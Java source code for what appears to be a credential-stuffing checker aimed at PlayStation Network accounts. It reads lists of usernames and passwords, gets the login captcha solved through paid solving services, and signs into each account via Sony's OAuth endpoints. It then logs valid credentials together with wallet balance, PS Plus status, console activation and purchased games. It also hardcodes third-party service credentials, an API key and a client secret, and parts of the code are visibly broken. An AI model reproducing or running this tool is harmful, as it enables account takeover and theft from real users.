package com.checker;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.function.Predicate;
import java.util.stream.Collectors;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.DeathByCaptcha.Captcha;
import com.DeathByCaptcha.Client;
import com.DeathByCaptcha.HttpClient;
import com.anti_captcha.Api.NoCaptcha;
import com.anti_captcha.Api.NoCaptchaProxyless;
import com.anti_captcha.Helper.DebugHelper;
import com.anti_captcha.Helper.HttpHelper;
import com.anti_captcha.Helper.JsonHelper;
import com.anti_captcha.Http.HttpRequest;
import com.anti_captcha.Http.HttpResponse;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

public class Main {

	static PrintWriter pw;
	
    public static void main(String[] args) throws InterruptedException, JSONException, IOException {
        // String recaptchaToken = deathByCaptcha();
    	String recaptchaToken = resolveRecaptcha();
    	List<Account> accounts = readAccountsFromFile();
    	executeWorker(accounts, recaptchaToken);
        
    }
    
    private static void executeWorker(List<Account> accounts, String recaptchaToken) throws IOException {
    	int i=0;
    	String currentLine;
    	String outputFileName = "/Users/bentaalaomar/Desktop/driver/output.txt";
        List<Account> validAccounts = new ArrayList<Account>();
    	final List<Account> accountsProgress = new ArrayList<Account>();
    	try {
    		URL resource = Main.class.getResource("output.txt");
    		BufferedReader outBr = new BufferedReader(new FileReader(new File(resource.getFile())));
			
	    	while ((currentLine = outBr.readLine()) != null) {
	    		if(currentLine.contains("<------")) {
	    			currentLine = currentLine.replace("<------  ", "");
	    			currentLine = currentLine.substring(0, currentLine.indexOf('(') - 1).trim();
	    			String[] credentialsStr = currentLine.split(":");
	    			if(credentialsStr.length == 2) {
		    			Account pAccount = new Account(credentialsStr[0], credentialsStr[1]);
		    			accountsProgress.add(pAccount);
	    			}
	    		}
	    	}
	    	outBr.close();
    	}catch(FileNotFoundException fnfEx) {} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    	
    	validAccounts = accounts.stream().filter(new Predicate<Account>() {
			public boolean test(Account acc) {
				return !IsDoublon(acc, accountsProgress);
			}
		}).collect(Collectors.<Account>toList());
    	    	
        for(Account acc : validAccounts) {
        	pw = new PrintWriter(
                    new FileWriter(outputFileName, true));
        	
        	System.out.println("status (" + i + "," + validAccounts.size() + ") checked"  ) ;
        	
        	String username = acc.getUsername();
            String password = acc.getPassword();
            
            Object[] result = authenticate(recaptchaToken, username);
            String token = (String) result[0];
            Map<String, String> cookies = (Map<String, String>) result[1];
            if (token != null) {
            	cookies = getSsoCookie(token, username, password, cookies);
                result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D9281f207-82e0-4d11-8d42-f1c66a7959a3");
                token = (String) result[0];
                cookies = (Map<String, String>) result[1];
                String languageStr = getLanguage(token, cookies);
            	String[] tokens = languageStr.split("-");
            	String language = tokens[0];
            	String country = tokens[1];
            	String balance = getBalance(token, cookies);
            	
            	Object[] codeAuthResult = authorizeWithCode(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=code&prompt=none&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D06b9d0fa-8fa6-4031-81ba-9d522d160844");
            	cookies = (Map<String, String>) codeAuthResult[0];
            	String authorizationCode = (String) codeAuthResult[1];
            	cookies = getSesstionCookies(authorizationCode, token, cookies);
            	boolean isPsPlus = isPsPlusMember(token, cookies);
            	boolean isPs4Activated = isPs4SystemActivated(token, cookies);

            	pw.println("<-------------- " 
            			+ username + ":" + password + "(lang_reg: " + languageStr + ", balance: " + balance + ", ps_plus: " + isPsPlus + ", ps4_Activated:" + isPs4Activated + ")" 
            			+ "------------------>");
            	
                 getPurchasedGames(cookies,language,country);
            	
            }
            pw.close();
        }
    }
    
	private static List<Account> readAccountsFromFile() {
	    List<Account> accounts = new ArrayList<Account>();
	    
		BufferedReader br;
		try {
			URL resource = Main.class.getResource("input.txt");
			br = new BufferedReader(new FileReader(new File(resource.getFile())));
			
			String currentLine;
	        List<Account> checkedAccounts = new ArrayList<Account>();
			while ((currentLine = br.readLine()) != null) {
				Account account = extractListFromInput(currentLine);
				if(account != null && account.getUsername().compareTo("") != 0 && account.getPassword().compareTo("") != 0) {
					if(!IsDoublon(account, checkedAccounts)) {
						accounts.add(new Account(account.getUsername(), account.getPassword()));
						checkedAccounts.add(new Account(account.getUsername(), account.getPassword()));
					}
					account = null;
				}
			}
			br.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
        
	}
	
	@SuppressWarnings("unused")
	private static Account extractListFromInput(String currentLine) {
		Account account = null;
		if(currentLine.contains("j_username=")) {
		    account = new Account();
			currentLine = currentLine.replaceFirst("j_username=", "");
			account.setUsername(currentLine);
		}
		else if(currentLine.contains("j_password=")) {
			if(account != null) {
				currentLine = currentLine.replaceFirst("j_password=", "");
				account.setPassword(currentLine);
			}
		}
		return account;
	}
	
	static boolean IsDoublon(final Account account, List<Account> checkedAccounts) {
		return !checkedAccounts.parallelStream().filter(
				new Predicate<Account>() {
					public boolean test(Account checkedAccount) {
						return checkedAccount.getUsername().compareTo(account.getUsername()) == 0 &&
							   checkedAccount.getPassword().compareTo(account.getPassword()) == 0;
					}
				}
			).collect(Collectors.toList()).isEmpty();
	}
    
	private static String deathByCaptcha() {
		String username = "zarga19021993";
	    String password = "Khraief1@";
	    Client client = (Client)(new HttpClient(username, password));
	    client.isVerbose = true;

	    try {
	        try {
	            System.out.println("Your balance is " + client.getBalance() + " US cents");
	        } catch (IOException e) {
	            System.out.println("Failed fetching balance: " + e.toString());
	            return null;
	        }

	        Captcha captcha = null;
	        try {
	            captcha = client.decode("","","6Le-UyUUAAAAAIqgW-LsIp5Rn95m_0V0kt_q0Dl5","https://id.sonyentertainmentnetwork.com/signin/?response_type=code&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fen-us%2Fhome%2Fgames&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&prompt=login&state=returning&request_locale=en_US&service_entity=urn%3Aservice-entity%3Apsn&hidePageElements=SENLogo&disableLinks=SENLink&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin");
	        } catch (IOException | InterruptedException e) {
	            System.out.println("Failed uploading CAPTCHA");
	            return null;
	        }
	        if (null != captcha) {
	            System.out.println("CAPTCHA " + captcha.id + " solved: " + captcha.text);
	            return captcha.text;
	        } else {
	            System.out.println("Failed solving CAPTCHA");
	        }
	    } catch (com.DeathByCaptcha.Exception e) {
	        System.out.println(e);
	    }
		return null;
	}
	
	private static boolean isPs4SystemActivated(String accountAuthorizationToken, Map<String, String> cookies) {
		HttpRequest request = new HttpRequest("https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/gateway/store/v1/users/me/device/activation/count");
		request.setCookies(cookies);
		HttpResponse response;
	      try {
	          response = HttpHelper.download(request);
	          JSONObject responseJson = new JSONObject(response.getBody());
	          try {
	          return responseJson
	        		  .getJSONObject("activatedConsoles")
	        		  .getInt("ps4") 
	        		  > 0;
	          }catch(JSONException jse) { return false;}
	      }catch(Exception e) {}
		return false;
	}

	private static boolean isPsPlusMember(String accountAuthorizationToken, Map<String, String> cookies) {
		HttpRequest request = new HttpRequest("https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/profile");
		request.setCookies(cookies);
		HttpResponse response;
	      try {
	          response = HttpHelper.download(request);
	          JSONObject responseJson = new JSONObject(response.getBody());
	          return responseJson
	        		  .getJSONObject("data")
	        		  .getBoolean("ps_plus");
	      }catch(Exception e) {}
		return false;
	}
	
    private static Map<String, String> getSesstionCookies(String authorizationCode, String accountAuthorizationToken, Map<String, String> cookies) {
    	
    	List<Map<String, String>> headers = new ArrayList<Map<String, String>>();
        Map<String, String> contentType = new HashMap<String, String>();
        contentType.put("Content-Type", "application/x-www-form-urlencoded");
        Map<String, String> xAltRefererHeader = new HashMap<String, String>();
        xAltRefererHeader.put("x-alt-referer", "https://store.playstation.com/html/webIframeRedirect.html?requestId=06b9d0fa-8fa6-4031-81ba-9d522d160844");
        headers.add(contentType);
        headers.add(xAltRefererHeader);
        
        String jsonPostData = "code=" + authorizationCode;

        HttpResponse postResponse = jsonPostRequest("https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/session", cookies,
                headers, jsonPostData);
        try {
            JSONObject postResult = new JSONObject(postResponse.getBody());
            return postResponse.getCookies();
        }catch (Exception e) {}
		return null;
    }
    
    private static JSONObject getCoreInfos(String authorizationToken, Map<String, String> cookies) {
    	
    	HttpRequest request = new HttpRequest("https://accounts.api.playstation.com/api/v1/accounts/me/core");
      
        request.addHeader("Authorization", "Bearer " + authorizationToken);
        request.setCookies(cookies); 
        
        HttpResponse response;
        try {
          response = HttpHelper.download(request);
          return new JSONObject(response.getBody());
        }catch(Exception e) {e.printStackTrace();}
        
		return null;
    }
    
    private static void getPurchasedGames(Map<String, String> cookies, String language, String country) {
	  Object[] result = authorize(cookies, "https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&prompt=none&client_id=894cc20a-89f9-4e40-977c-76736871f7da&scope=kamaji%3Aget_account_hash%2Cuser%3Aaccount.address.get%2Cuser%3Aaccount.address.update%2Cuser%3Aaccount.core.get%2Cuser%3Aaccount.languages.get%2Cuser%3Aaccount.subaccounts.get%2Cversa%3Atv_get_dmas%2Cversa%3Auser_get_dma%2Cversa%3Auser_update_dma%2Cwallets%3Ainstrument.get%2Cwallets%3Ainstrument.verify%2Cwallets%3AmetaInfo.get%2Cwallets%3Ainstrument.create.gated%2Cwallets%3Ainstrument.delete.gated%2Cwallets%3Ainstrument.update.gated%2Cwallets%3Apreference.get.gated%2Cwallets%3Apreference.update.gated%2Cwallets%3Atransaction.create.gated%2Cwallets%3Atransaction.update.gated%2Cwallets%3Avoucher.consume.gated%2Cwallets%3Avoucher.get.gated%2Cwallets%3Atransaction.get.gated&redirect_uri=https%3A%2F%2Ftransact.playstation.com%2Fhtml%2FwebIframeRedirect.html%3FrequestId%3D4a21e2e5-70c0-4d35-86cb-50b11e0e6391");
	  String authorizationToken = (String) result[0];
	  cookies = (Map<String, String>) result[1];
	  JSONObject coreInfosWrapper = getCoreInfos(authorizationToken, cookies);
	  try {
		  String accountId = coreInfosWrapper.getString("accountId");
		
		  HttpRequest request = new HttpRequest(
	          "https://wallets.api.playstation.com/api/transactions/summaries?ownerAccountId=" + accountId + "&limit=500&startDate=2016-02-16T00%3A00%3A00.000%2B0100&endDate=2019-02-16T23%3A59%3A59.999%2B0100&includePurged=false&transactionTypes=PRODUCT_PURCHASE");

	      request.addHeader("Authorization", "Bearer " + authorizationToken);
	      request.setCookies(cookies); 
	      
	      HttpResponse response;
	
	        response = HttpHelper.download(request);
	        JSONObject responseJson = new JSONObject(response.getBody());
	        JSONArray transactions = 
	        		responseJson
	        			.getJSONArray("transactions");
	        	        
	        List<String> checkedProductNames = new ArrayList<String>();
			String productName = "";

	        for(int i=0; i<transactions.length(); i++) {
	        	JSONArray orders = 
	        			transactions
			        		.getJSONObject(i)
			        		.getJSONObject("additionalInfo")
			        		.getJSONArray("orderItems");
	        	for(int j=0; j<orders.length(); j++) {
	        		JSONObject order = 
	        				orders
	        					.getJSONObject(j);
	        		int totalPrice = order.getInt("totalPrice");
	        		boolean isPSNReduced = false;
	        		try {
	        			JSONArray orderItemDiscounts = order.getJSONArray("orderItemDiscounts");
	        			isPSNReduced = orderItemDiscounts.length() > 0;
	        		}catch(JSONException e) {}
	        		if(totalPrice > 0 || isPSNReduced) {
                    	productName = isAGameProduct(order.getString("skuId"), language, country);
                    	if(!checkedProductNames.contains(productName)) {
            	            pw.println(productName);
                			checkedProductNames.add(productName);
                		}
	        		}
	        			
	        	}
	        }
	        
      }catch(Exception e) {e.printStackTrace();}
    }

    private static String getBalance(String authorizationToken, Map<String, String> cookies) {
    	HttpRequest request = new HttpRequest(
                "https://wallets.api.playstation.com/api/v1/wallets/me");
    	
        request.addHeader("Authorization", "Bearer " + authorizationToken);
        request.setCookies(cookies);
        HttpResponse response;
        try {
            response = HttpHelper.download(request);
            JSONObject responseObject = new JSONObject(response.getBody());
            return responseObject.getInt("currentAmount") + " " + responseObject.getString("currencyCode");

        } catch (Exception e) {
            //DebugHelper.out("JSON parse problem: " + e.getMessage(), //DebugHelper.Type.ERROR);
            return null;
        }
    }
    
    private static String getLanguage(String authorizationToken, Map<String, String> cookies) {
    	HttpRequest request = new HttpRequest(
                "https://accounts.api.playstation.com/api/v1/accounts/me/languages");
    	
        request.addHeader("Authorization", "Bearer " + authorizationToken);
        request.setCookies(cookies);
        HttpResponse response;
        try {
            response = HttpHelper.download(request);
            JSONObject responseObject = new JSONObject(response.getBody());
            return responseObject.getString("language");

        } catch (Exception e) {
            //DebugHelper.out("JSON parse problem: " + e.getMessage(), //DebugHelper.Type.ERROR);
            return null;
        }
    }
    
    private static Object[] authorizeWithCode(Map<String, String> cookies, String url) {
        HttpRequest request = new HttpRequest(url);
        try {
            request.setCookies(cookies);
            request.setFollowRedirects(false);
            HttpResponse response = HttpHelper.download(request);
            String locationRedirect = response.getHeaders().get("Location");
            int startIndex = locationRedirect.indexOf("&") + 1;
            int endIndex = locationRedirect.indexOf("&", startIndex);
            String authorizationTokenStr = locationRedirect.substring(startIndex, endIndex);
            String[] authorizationTokenList = authorizationTokenStr.split("=");
            Object[] result = new Object[2];
            result[0] = response.getCookies();
            result[1] = authorizationTokenList[1];
            return result;
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return null;
    }

    private static Object[] authorize(Map<String, String> cookies, String url) {
        HttpRequest request = new HttpRequest(url);
        try {
            request.setCookies(cookies);
            request.setFollowRedirects(false);
            HttpResponse response = HttpHelper.download(request);
            String locationRedirect = response.getHeaders().get("Location");
            int startIndex = locationRedirect.indexOf("#");
            int endIndex = locationRedirect.indexOf("&", startIndex);
            String authorizationTokenStr = locationRedirect.substring(startIndex, endIndex);
            String[] authorizationTokenList = authorizationTokenStr.split("=");
            Object[] result = new Object[2];
            result[0] = authorizationTokenList[1];
            result[1] = response.getCookies();
            return result;
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return null;
    }

    private static Map<String, String> getSsoCookie(String access_token, String username, String password, Map<String, String> cookies) {
        JSONObject postData = new JSONObject();

        try {
            postData.put("authentication_type", "password");
            postData.put("client_id", "71a7beb8-f21a-47d9-a604-2e71bee24fe0");
            postData.put("password", password);
            postData.put("username", username);
        } catch (JSONException e) {
            //DebugHelper.out("JSON compilation error: " + e.getMessage(), //DebugHelper.Type.ERROR);
        }

        List<Map<String, String>> headers = new ArrayList<Map<String, String>>();
        Map<String, String> contentType = new HashMap<String, String>();
        contentType.put("Content-Type", "application/json");
        Map<String, String> authorization = new HashMap<String, String>();
        contentType.put("Authorization", "Bearer " + access_token);
        headers.add(contentType);
        headers.add(authorization);

        HttpResponse postResponse = jsonPostRequest("https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie", cookies,
                headers, JsonHelper.asString(postData));

        try {
            JSONObject postResult = new JSONObject(postResponse.getBody());
            Integer error_code = null;
            try {
            	error_code = JsonHelper.extractInt(postResult, "error_code");
            } catch (Exception e) {}

            if (error_code == null) {
                return postResponse.getCookies();
            } else {
                //DebugHelper.out("Unknown error", //DebugHelper.Type.ERROR);
            }

        } catch (Exception e) {
            //DebugHelper.out("JSON parse problem: " + e.getMessage(), //DebugHelper.Type.ERROR);

            return null;
        }
        return null;

    }

    private static Object[] authenticate(String recaptchaToken, String username) {
        String jsonPostData = "grant_type=captcha" + "&captcha_provider=google:recaptcha-invisible"
                + "&scope=oauth:authenticate" + "&valid_for=" + username
                + "&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0" + "&client_secret=xSk2YI8qJqZfeLQv"
                + "&response_token=" + recaptchaToken;

        List<Map<String, String>> headers = new ArrayList<Map<String, String>>();
        Map<String, String> contentType = new HashMap<String, String>();
        contentType.put("Content-Type", "application/x-www-form-urlencoded");
        headers.add(contentType);

        HttpResponse postResponse = jsonPostRequest("https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/token", null,
                headers, jsonPostData);
        try {
            JSONObject postResult = new JSONObject(postResponse.getBody());
            Integer error_code = null;
            try {
            	error_code = JsonHelper.extractInt(postResult, "error_code");
            } catch (Exception e) {}

            if (error_code == null) {
            	Object[] result = new Object[2];
            	result[0] = JsonHelper.extractStr(postResult, "access_token");
            	result[1] = postResponse.getCookies();
                return result;
            } else {
                //DebugHelper.out("Unknown error", //DebugHelper.Type.ERROR);
            }

        } catch (Exception e) {
            //DebugHelper.out("JSON parse problem: " + e.getMessage(), //DebugHelper.Type.ERROR);

            return null;
        }
        return null;

    }

    private static String resolveRecaptcha() throws MalformedURLException, InterruptedException {
        //DebugHelper.setVerboseMode(true);

        NoCaptchaProxyless api = new NoCaptchaProxyless();
        api.setClientKey("466410a2abec5e57da541ed2cf603657");
        api.setWebsiteUrl(new URL(
                "https://id.sonyentertainmentnetwork.com/signin/?response_type=code&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fen-us%2Fhome%2Fgames&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&prompt=login&state=returning&request_locale=en_US&service_entity=urn%3Aservice-entity%3Apsn&hidePageElements=SENLogo&disableLinks=SENLink&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin"));
        api.setWebsiteKey("6Le-UyUUAAAAAIqgW-LsIp5Rn95m_0V0kt_q0Dl5");

        if (!api.createTask()) {
            DebugHelper.out("API v2 send failed. " + api.getErrorMessage(), DebugHelper.Type.ERROR);
        } else if (!api.waitForResult()) {
            DebugHelper.out("Could not solve the captcha.", DebugHelper.Type.ERROR);
        } else {
            DebugHelper.out("Result: " + api.getTaskSolution().getGRecaptchaResponse(), DebugHelper.Type.SUCCESS);
            return api.getTaskSolution().getGRecaptchaResponse();
        }
        return null;
    }

    public static HttpResponse jsonPostRequest(String url, Map<String, String> cookies, List<Map<String, String>> headers, String jsonPostData) {

        HttpRequest request = new HttpRequest(url);
        if(cookies != null)
        	request.setCookies(cookies);
        request.setRawPost(jsonPostData);
        for (Map<String, String> header : headers) {
            for (Map.Entry<String, String> entry : header.entrySet()) {
                request.addHeader(entry.getKey(), entry.getValue());
            }
        }
        // request.setTimeout(10_000);

        String rawJson;

        try {
            return HttpHelper.download(request);
        } catch (Exception e) {
            //DebugHelper.out("HTTP problem: " + e.getMessage(), //DebugHelper.Type.ERROR);

            return null;
        }

    }

    private static String flatMap(Map<String, String> map) {
        String result = "";
        for (Map.Entry<String, String> entry : map.entrySet()) {
            result += entry.getKey() + "=" + entry.getValue() + ";";
        }
        return null;

    }
    
    

  private static String isAGameProduct(String productId, String language, String country) {
		HttpRequest request = new HttpRequest(
              "https://store.playstation.com/valkyrie-api/" + language + "/" + country + "/999/resolve/" + productId + "?depth=0");
		request.setTimeout(2_000);
   	HttpResponse response;
      try {
          response = HttpHelper.download(request);
          
          JSONObject entitlementWrapper = new JSONObject(response.getBody());
          JSONObject mainGameEntitlement = 
        		  entitlementWrapper
  			        	.getJSONObject("data")
  			        	.getJSONObject("relationships")
  			        	.getJSONObject("children")
  			        	.getJSONArray("data")
  			        	.getJSONObject(0);
  			        	
          String productType = 
        		  mainGameEntitlement
			        	.getString("type");
          
         if(productType.compareToIgnoreCase("game") == 0) {
	            JSONObject atributes = 
		            entitlementWrapper
			    		.getJSONArray("included")
			    		.getJSONObject(0)
			    		.getJSONObject("attributes");
	            String gameTitle = atributes.getString("name");
    			return gameTitle;
	            
         }
      } catch (Exception e) {
      }
	return null;
  	
  }
    
}